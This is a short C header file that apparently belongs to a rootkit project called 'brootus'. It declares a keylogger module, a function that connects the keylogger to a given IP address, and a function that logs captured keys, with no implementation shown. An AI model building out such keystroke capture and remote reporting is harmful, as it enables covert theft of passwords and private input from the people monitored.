#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include "brootus.h"

BROOTUS_MODULE(keylogger);

extern void connect_keylogger(char* ip_str);
extern void log_keys(char* keys, int len);

#endif

